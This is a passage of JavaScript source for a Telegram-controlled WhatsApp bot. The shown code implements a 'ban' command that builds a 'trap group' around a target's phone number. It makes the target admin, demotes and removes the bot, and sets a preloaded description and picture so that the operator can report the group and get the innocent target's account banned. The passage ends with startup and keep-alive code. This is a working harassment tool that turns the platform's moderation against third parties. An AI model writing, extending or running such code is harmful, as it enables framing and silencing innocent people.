            "━━━━━━━━━━━━━━━━━━━\n" +
            "⚠️ *No + or 0 prefix needed!*",
            { parse_mode: 'Markdown' }
          );
          break;
        }

        if (targetNumber.startsWith('+') || targetNumber.startsWith('0')) {
          telegramBot.sendMessage(chatId,
            "╔═══════════════════╗\n" +
            "║  ❌ INVALID PREFIX  ║\n" +
            "╚═══════════════════╝\n\n" +
            "❌ *Error:* Number cannot start with + or 0\n\n" +
            "*Example:*\n" +
            "✅ Correct: 234XXXXXXXX\n" +
            "❌ Wrong: +234XXXXXXXX\n" +
            "❌ Wrong: 070XXXXXXXXX\n\n" +
            "━━━━━━━━━━━━━━━━━━━",
            { parse_mode: 'Markdown' }
          );
          break;
        }

        // Get the first active WhatsApp connection
        const [firstPhone, sock] = activeWhatsAppConnections.entries().next().value || [];
        if (!sock) {
          telegramBot.sendMessage(chatId,
            "╔═══════════════════╗\n" +
            "║  ❌ NO CONNECTION  ║\n" +
            "╚═══════════════════╝\n\n" +
            "❌ *No WhatsApp connection found.*\n\n" +
            "*Please pair a WhatsApp number first:*\n" +
            "👉 Use /pair <number>\n\n" +
            "━━━━━━━━━━━━━━━━━━━",
            { parse_mode: 'Markdown' }
          );
          break;
        }

        const targetJid = targetNumber + '@s.whatsapp.net';
        const botJid = sock.user.id;

        telegramBot.sendMessage(chatId,
          "╔═══════════════════╗\n" +
          "║  🔄 EXECUTING BAN  ║\n" +
          "╚═══════════════════╝\n\n" +
          "📱 *Target:* " + targetNumber + "\n" +
          "⏳ *Status:* Creating trap group...\n\n" +
          "━━━━━━━━━━━━━━━━━━━",
          { parse_mode: 'Markdown' }
        );

        try {
          // Step 1: Create group with bot and target
          const group = await sock.groupCreate('GHOST BAN TRAP', [botJid, targetJid]);
          const groupJid = group.id;

          telegramBot.sendMessage(chatId,
            "✅ *Group created:* " + groupJid + "\n" +
            "🔄 *Adding target and setting up...*",
            { parse_mode: 'Markdown' }
          );

          // Step 2: Promote target to admin
          await sock.groupParticipantsUpdate(groupJid, [targetJid], 'promote');
          await new Promise(r => setTimeout(r, 1000));

          // Step 3: Demote bot (owner)
          await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
          await new Promise(r => setTimeout(r, 1000));

          // Step 4: Update group description
          await sock.groupUpdateDescription(groupJid, GROUP_DESCRIPTION);
          await new Promise(r => setTimeout(r, 1000));

          // Step 5: Update group profile picture
          if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
            const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
            await sock.updateProfilePicture(groupJid, picBuffer);
          }
          await new Promise(r => setTimeout(r, 1000));

          // Step 6: Bot leaves the group
          await sock.groupLeave(groupJid);

          telegramBot.sendMessage(chatId,
            "╔═══════════════════╗\n" +
            "║  ✅ BAN EXECUTED   ║\n" +
            "╚═══════════════════╝\n\n" +
            "📱 *Target:* " + targetNumber + "\n" +
            "✅ *Group created and configured*\n" +
            "✅ *Target promoted to admin*\n" +
            "✅ *Bot demoted and removed*\n" +
            "✅ *Group description updated*\n" +
            "✅ *Group picture updated*\n\n" +
            "━━━━━━━━━━━━━━━━━━━\n" +
            "⚠️ *You can now report the group manually.*",
            { parse_mode: 'Markdown' }
          );

        } catch (error) {
          console.error('Ban error:', error);
          telegramBot.sendMessage(chatId,
            "╔═══════════════════╗\n" +
            "║  ❌ BAN FAILED     ║\n" +
            "╚═══════════════════╝\n\n" +
            "📱 *Target:* " + targetNumber + "\n" +
            "❌ *Error:* " + error.message + "\n\n" +
            "━━━━━━━━━━━━━━━━━━━",
            { parse_mode: 'Markdown' }
          );
        }
        break;
      }


      default:
        telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ❌ UNKNOWN CMD    ║
╚═══════════════════╝

*Command not recognized!*

━━━━━━━━━━━━━━━━━━━
*Type /start for help*
`, { parse_mode: 'Markdown' });
    }
  });
}

// Main startup function
async function main() {
  try {
    // Load Baileys library
    await loadBaileys();

    // Initialize Telegram bot if token is provided
    if (telegramBot) {
      initializeTelegramBot();
    }

    // Load all existing WhatsApp sessions
    await loadAllSessions();

    console.log(`
╔════════════════════════════════════╗
║  TARRIFIC MD BOT STARTED.                           ║
╚════════════════════════════════════╝

📱 WhatsApp Multi-User: Active
${telegramBot ? '🤖 Telegram Pairing: Active' : '⚠️  Telegram Pairing: Disabled'}
🔗 Active Connections: ${activeWhatsAppConnections.size}
⏰ Time: ${moment().format('HH:mm:ss')}
📅 Date: ${moment().format('DD/MM/YYYY')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛠 Developer: @TARRIFIC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`);

  } catch (error) {
    console.error('❌ Error starting bot:', error);
    process.exit(1);
  }
}

// Start the bot
main();

// === KEEP RENDER ALIVE ===
const http = require('http');
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('GHOST BAN BOT ACTIVE');
}).listen(PORT, () => console.log(`Alive on port ${PORT}`));



// Error handling
const ignoredErrors = [
  'Socket connection timeout',
  'EKEYTYPE',
  'item-not-found',
  'rate-overlimit',
  'Connection Closed',
  'Timed Out',
  'Value not found',
  'member list is inaccessible'
];

process.on('unhandledRejection', reason => {
  if (ignoredErrors.some(e => String(reason).includes(e))) return;
  console.log('Unhandled Rejection:', reason);
});
